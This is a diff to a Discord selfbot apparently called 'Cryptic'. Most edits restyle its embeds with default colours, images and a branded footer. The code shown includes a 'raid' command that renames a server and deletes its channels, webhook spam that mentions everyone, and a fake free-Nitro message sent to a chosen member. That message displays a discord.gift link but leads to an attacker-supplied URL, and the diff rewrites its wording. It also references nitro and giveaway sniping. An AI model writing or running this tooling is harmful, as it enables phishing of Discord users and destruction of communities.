@@ -34,18 +34,6 @@ title(`[${selfbot.name} v${selfbot.version}] Loading...`)
 bot.on("ready", () => {
     console.clear()
     title(`[${selfbot.name} v${selfbot.version}] Logged in as ${bot.user.username}`)
-    let nitroSniper = "";
-    let giveawaySniper = "";
-    if(config.nitro_sniper === false) {
-        nitroSniper = colors.red("Disabled")
-    } else if(config.nitro_sniper === true) {
-        nitroSniper = colors.green("Enabled")
-    }
-    if(config.giveaway_sniper === false) {
-        giveawaySniper = colors.red("Disabled")
-    } else if(config.giveaway_sniper === true) {
-        giveawaySniper = colors.green("Enabled")
-    }
     if(config.credit === true) {
         bot.user.setActivity("https://discord.com/invite/FRGKTJsFJg", {type: "PLAYING"})
     }
@@ -66,8 +54,8 @@ bot.on("ready", () => {
                             
 
                             ${colors.cyan(selfbot.name)} ${colors.yellow(`v${selfbot.version}`)} ${colors.magenta("|")} ${colors.cyan("Logged in as")} ${colors.yellow(bot.user.tag)} ${colors.magenta("|")} ${colors.cyan("ID:")} ${colors.yellow(bot.user.id)}
-                            ${colors.cyan("Nitro Sniper?")} ${nitroSniper}
-                            ${colors.cyan("Giveaway Sniper?")} ${giveawaySniper}
+                            ${colors.cyan("Nitro Sniper?")} ${config.nitro_sniper ? colors.green("Enabled") : colors.red("Disabled")}
+                            ${colors.cyan("Giveaway Sniper?")} ${config.giveaway_sniper ? colors.green("Enabled") : colors.red("Disabled")}
                             ${colors.cyan("Prefix:")} ${colors.yellow(`${config.prefix}`)}
                             ${colors.cyan("GitHub:")} ${colors.yellow("https://github.com/p9sq/Cryptic")}
                             ${colors.cyan("Developer:")} ${colors.yellow("p9sq69#0594")}
@@ -97,25 +85,18 @@ bot.on("message", async(message) => {
         }
         const role = message.mentions.roles.first()
         if(!role) return message.channel.send("Please mention a role")
+        let embed = new Discord.RichEmbed()
+        .setTitle("Success")
+        .setDescription(`Successfully made the ${role.name} role rainbow`)
+        .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+        .setColor(color ? color : "#1B78E7")
+        .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+        message.channel.send(embed)
         setInterval(() => {
             role.edit({
                 color: "RANDOM"
             })
         })
-    }
-
-    if(cmd === "reboot") {
-        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
-        if(message.deletable) {
-             message.delete()
-        }
-        message.channel.send("Rebooting...")
-        console.clear()
-        console.log("Logging in, please wait...")
-        title(`[${selfbot.name} v${selfbot.version}] Loading...`)
-        setTimeout(() => {
-            bot.emit("ready")
-        }, 3000)
     }
 
     if(cmd === "codeblock") {
@@ -242,9 +223,9 @@ bot.on("message", async(message) => {
             **Date** » ${msg.date}
             **Page** » ${args[0]||1}/${snipes.length}
             `)
-            .setThumbnail(image ? image : null)
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             if(msg.attachment) {
                 embed.setImage(msg.attachment)
             }
@@ -314,9 +295,9 @@ bot.on("message", async(message) => {
         if(!args.join(" ")) return message.channel.send("Please specify a message.")
         const {body} = await post("https://hastebin.com/documents").send(args.join(" "))
         let embed = new Discord.RichEmbed()
-        .setThumbnail(image ? image : null)
-        .setColor(color ? color : null)
-        .setFooter(footer ? footer : "")
+        .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+        .setColor(color ? color : "#1B78E7")
+        .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
         .setDescription(`https://hastebin.com/${body.key}`)
         message.channel.send(embed)
     }
@@ -409,9 +390,9 @@ bot.on("message", async(message) => {
                 **Message** » ${msg.createdTimestamp - message.createdTimestamp}ms
                 **WebSocket** » ${bot.ping}ms
                 `)
-                .setThumbnail(image ? image : null)
-                .setColor(color ? color : null)
-                .setFooter(footer ? footer : "")
+                .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+                .setColor(color ? color : "#1B78E7")
+                .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
                 msg.edit(embed)
             } else {
                 msg.edit(stripIndents`\`\`\`
@@ -433,9 +414,9 @@ bot.on("message", async(message) => {
         if(enabled === true) {
             let embed = new Discord.RichEmbed()
             .setDescription(args.join(" "))
-            .setThumbnail(image ? image : null)
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             message.channel.send(embed)
         } else {
             message.channel.send(`\`\`\`${args.join(" ")}\`\`\``)
@@ -495,8 +476,8 @@ bot.on("message", async(message) => {
     //Create the embed
     if(enabled === true) {
         let Embed = new Discord.RichEmbed()
-        .setColor(color ? color : null)
-        .setFooter(footer ? footer : "")
+        .setColor(color ? color : "#1B78E7")
+        .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
         .setTitle(`${message.guild.name} info`)
         .setThumbnail(message.guild.iconURL)
         .addField("Guild Name", message.guild.name, true)
@@ -598,8 +579,8 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
         if(enabled === true) {
             let embed = new Discord.RichEmbed()
             .setTitle("Random dog image")
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             .setImage(body.link)
             message.channel.send(embed);
         } else {
@@ -618,8 +599,8 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
         if(enabled === true) {
             let embed = new Discord.RichEmbed()
             .setTitle("Random cat image")
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             .setImage(body.link)
             message.channel.send(embed);
         } else {
@@ -638,8 +619,8 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
         if(enabled === true) {
             let embed = new Discord.RichEmbed()
             .setTitle("Random fox image")
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             .setImage(body.link)
             message.channel.send(embed);
         } else {
@@ -690,8 +671,8 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
         if(enabled === true) {
             let embed = new Discord.RichEmbed()
             .setDescription(`${message.author} winks at ${user}`)
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             .setImage(body.link)
             message.channel.send(embed);
         } else {
@@ -712,8 +693,8 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
         if(enabled === true) {
             let embed = new Discord.RichEmbed()
             .setDescription(`${message.author} pats ${user}`)
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             .setImage(body.link)
             message.channel.send(embed);
         } else {
@@ -734,8 +715,8 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
         if(enabled === true) {
             let embed = new Discord.RichEmbed()
             .setDescription(`${message.author}  hugs ${user}`)
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             .setImage(body.link)
             message.channel.send(embed);
         } else {
@@ -765,8 +746,8 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
             let embed = new Discord.RichEmbed()
             .setTitle(body.caption)
             .setImage(body.image)
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             message.channel.send(embed)
         } else {
             let img = new Discord.Attachment(body.image, "meme.png")
@@ -869,9 +850,9 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
             **${prefix}webhookspam <amount> <message>** » Spams a webhook the specified amount of times and mentions everyone (Must have webhook id and token in config.json) [GUILD ONLY]`
             let embed = new Discord.RichEmbed()
             .setTitle("Fun Commands")
-            .setThumbnail(image ? image : null)
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             if(description.length < 2000) {
                 embed.setDescription(description)
             } else {
@@ -908,9 +889,9 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
         if(enabled === true) {
             let embed = new Discord.RichEmbed()
             .setTitle("Text Commands")
-            .setThumbnail(image ? image : null)
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             .setDescription(`
             <> = required | [] = optional
 
@@ -956,9 +937,9 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
         if(enabled === true) {
             let embed = new Discord.RichEmbed()
             .setTitle("Utility Commands")
-            .setThumbnail(image ? image : null)
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             .setDescription(`
             <> = required | [] = optional
 
@@ -991,9 +972,9 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
         if(enabled === true) {
             let embed = new Discord.RichEmbed()
             .setTitle("Available Commands")
-            .setThumbnail(image ? image : null)
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             .setDescription(`
             <> = required | [] = optional
 
@@ -1038,9 +1019,9 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
       if(enabled === true) {
           let embed = new Discord.RichEmbed()
           .setTitle("Troll Commands")
-          .setThumbnail(image ? image : null)
-          .setColor(color ? color : null)
-          .setFooter(footer ? footer : "")
+          .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+          .setColor(color ? color : "#1B78E7")
+          .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
           .setDescription(`
           <> = required | [] = optional
 
@@ -1076,9 +1057,9 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
         if(enabled === true) {
             let embed = new Discord.RichEmbed()
             .setTitle("Info Commands")
-            .setThumbnail(image ? image : null)
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             .setDescription(`
             <> = required | [] = optional
 
@@ -1116,9 +1097,9 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
         if(enabled === true) {
             let embed = new Discord.RichEmbed()
             .setTitle("Face Commands")
-            .setThumbnail(image ? image : null)
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             .setDescription(`
             <> = required | [] = optional
 
@@ -1150,9 +1131,9 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
       if(enabled === true) {
           let embed = new Discord.RichEmbed()
           .setTitle("Status Commands")
-          .setThumbnail(image ? image : null)
-          .setColor(color ? color : null)
-          .setFooter(footer ? footer : "")
+          .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+          .setColor(color ? color : "#1B78E7")
+          .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
           .setDescription(`
           <> = required | [] = optional
       
@@ -1186,9 +1167,9 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
       if(enabled === true) {
           let embed = new Discord.RichEmbed()
           .setTitle("Animal Commands")
-          .setThumbnail(image ? image : null)
-          .setColor(color ? color : null)
-          .setFooter(footer ? footer : "")
+          .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+          .setColor(color ? color : "#1B78E7")
+          .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
           .setDescription(`
           <> = required | [] = optional
       
@@ -1218,9 +1199,9 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
       if(enabled === true) {
           let embed = new Discord.RichEmbed()
           .setTitle("Nuke Commands")
-          .setThumbnail(image ? image : null)
-          .setColor(color ? color : null)
-          .setFooter(footer ? footer : "")
+          .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+          .setColor(color ? color : "#1B78E7")
+          .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
           .setDescription(`
           <> = required | [] = optional
       
@@ -1262,9 +1243,9 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
     if(enabled === true) {
       let embed = new Discord.RichEmbed()
       .setTitle("Moderation Commands [GUILD ONLY]")
-      .setThumbnail(image ? image : null)
-      .setColor(color ? color : null)
-      .setFooter(footer ? footer : "")
+      .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+      .setColor(color ? color : "#1B78E7")
+      .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
       .setDescription(`
         <> = required | [] = optional
       
@@ -1302,9 +1283,9 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
     if(enabled === true) {
       let embed = new Discord.RichEmbed()
       .setTitle("Dangerous Commands [GUILD ONLY]")
-      .setThumbnail(image ? image : null)
-      .setColor(color ? color : null)
-      .setFooter(footer ? footer : "")
+      .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+      .setColor(color ? color : "#1B78E7")
+      .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
       .setDescription(`
         <> = required | [] = optional
       
@@ -1330,9 +1311,9 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
     if(enabled === true) {
       let embed = new Discord.RichEmbed()
       .setTitle("Account Commands")
-      .setThumbnail(image ? image : null)
-      .setColor(color ? color : null)
-      .setFooter(footer ? footer : "")
+      .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+      .setColor(color ? color : "#1B78E7")
+      .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
       .setDescription(`
         <> = required | [] = optional
       
@@ -1566,7 +1547,7 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
     if(cmd === "raid") {
         console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
         if(message.guild.me.hasPermission("ADMINISTRATOR")) {
-            message.guild.setIcon("https://i.gyazo.com/863bc487c8c72c3d21a747e300e3c21a.png")
+            message.guild.setIcon("https://i.gyazo.com/e720243a3d6cd9425e8b97456263debd.png")
             message.guild.setName("RAIDED BY CRYPTIC")
             message.guild.channels.forEach(ch => {
                 ch.delete()
@@ -1728,9 +1709,9 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
           for (var i = 0; i < spamAmount; i++) {
             let embed = new Discord.RichEmbed()
             .setTitle("You've just been raided")
-            .setThumbnail(image ? image : null)
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setThumbnail(image ? image : "https://media3.giphy.com/media/TzyV32fsqLpbA0PHJf/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             .setDescription(spamContent)
             hook.send("@everyone", embed)
           }
@@ -1758,7 +1739,7 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
             .addField("Account Created", moment(user.createdAt).format('MMMM Do YYYY, h:mm A'), true)
             .addField(`[${member.roles.size}] Total Roles`, role)
             .addField("Guild Permissions", perms)
-            .setFooter(footer ? footer : "")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             .setTimestamp()
             message.channel.send(embed)
         } else {
@@ -1803,7 +1784,13 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
 
         var uptime = wks + wksInfo + day + dayInfo + hrs + hrsInfo + min + minInfo + sec + secInfo
         // var timeZone = new Date().toString().match(/\(([A-Za-z\s].*)\)/)[1]
-        message.channel.send(`I've been online for: **${uptime}** (Since ${moment().subtract(bot.uptime, "ms").format("L LTS")})`)
+        let embed = new Discord.RichEmbed()
+        .setTitle("Uptime")
+        .addField("Online for:", `${uptime} | Since ${moment().subtract(bot.uptime, "ms").format("L LTS")}`)
+        .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+        .setColor(color ? color : "#1B78E7")
+        .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+        message.channel.send(embed)
     }
 
     if(cmd === "delchannels") {
@@ -1895,12 +1882,11 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
         if(!args[1]) return message.channel.send("Please specify a redirect url")
         message.channel.send("Done!")
         let embed = new Discord.RichEmbed()
-        .setAuthor("Congratulations! You have won a free discord nitro code!", "https://i.gyazo.com/80906ef5fe2f571b352ed3cbe53734ef.png")
-        .setThumbnail(image ? image : null)
-        .setColor(color ? color : null)
-        .setFooter(footer ? footer : "")
+        .setAuthor("Free Discord Nitro", "https://i.gyazo.com/80906ef5fe2f571b352ed3cbe53734ef.png")
+        .setTitle("Congratulations, you have received a free discord nitro gift")
+        .setColor(color ? color : "#1B78E7")
+        .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘", "https://i.gyazo.com/e720243a3d6cd9425e8b97456263debd.png")
         .setTimestamp()
-        .setThumbnail()
         .addField("Redeem Here:", `[https://discord.gift/${nitroCode()}](${args[1]})`)
         message.guild.members.get(args[0]).send(embed)
     }
@@ -1982,7 +1968,7 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
         }
         if(enabled === true) {
             let embed = new Discord.RichEmbed()
-            .setThumbnail("https://media3.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+            .setThumbnail("https://i.gyazo.com/e720243a3d6cd9425e8b97456263debd.png")
             .setColor("#1B78E7")
             .setFooter("𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             .setTitle("Cryptic")
@@ -2051,9 +2037,9 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
         if(enabled === true) {
             let embed = new Discord.RichEmbed()
             .setTitle("Success")
-            .setThumbnail(image ? image : null)
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setThumbnail(image ? image : "https://media3.giphy.com/media/TzyV32fsqLpbA0PHJf/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             .setDescription(`Your activity was successfully set to \`STREAMING\` with message \`${msg}\``)
             message.channel.send(embed);
         } else {
@@ -2075,9 +2061,9 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
         if(enabled === true) {
             let embed = new Discord.RichEmbed()
             .setTitle("Success")
-            .setThumbnail(image ? image : null)
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setThumbnail(image ? image : "https://media3.giphy.com/media/TzyV32fsqLpbA0PHJf/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             .setDescription(`Your activity was successfully set to \`WATCHING\` with message \`${msg}\``)
             message.channel.send(embed);
         } else {
@@ -2099,9 +2085,9 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
         if(enabled === true) {
             let embed = new Discord.RichEmbed()
             .setTitle("Success")
-            .setThumbnail(image ? image : null)
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setThumbnail(image ? image : "https://media3.giphy.com/media/TzyV32fsqLpbA0PHJf/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             .setDescription(`Your activity was successfully set to \`LISTENING\` with message \`${msg}\``)
             message.channel.send(embed);
         } else {
@@ -2123,9 +2109,9 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
         if(enabled === true) {
             let embed = new Discord.RichEmbed()
             .setTitle("Success")
-            .setThumbnail(image ? image : null)
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setThumbnail(image ? image : "https://media3.giphy.com/media/TzyV32fsqLpbA0PHJf/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             .setDescription(`Your activity was successfully set to \`PLAYING\` with message \`${msg}\``)
             message.channel.send(embed);
         } else {
@@ -2146,9 +2132,9 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
         if(enabled === true) {
             let embed = new Discord.RichEmbed()
             .setTitle("Success")
-            .setThumbnail(image ? image : null)
-            .setColor(color ? color : null)
-            .setFooter(footer ? footer : "")
+            .setThumbnail(image ? image : "https://media3.giphy.com/media/TzyV32fsqLpbA0PHJf/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
             .setDescription(`Your activity was successfully reset`)
             message.channel.send(embed);
         } else {
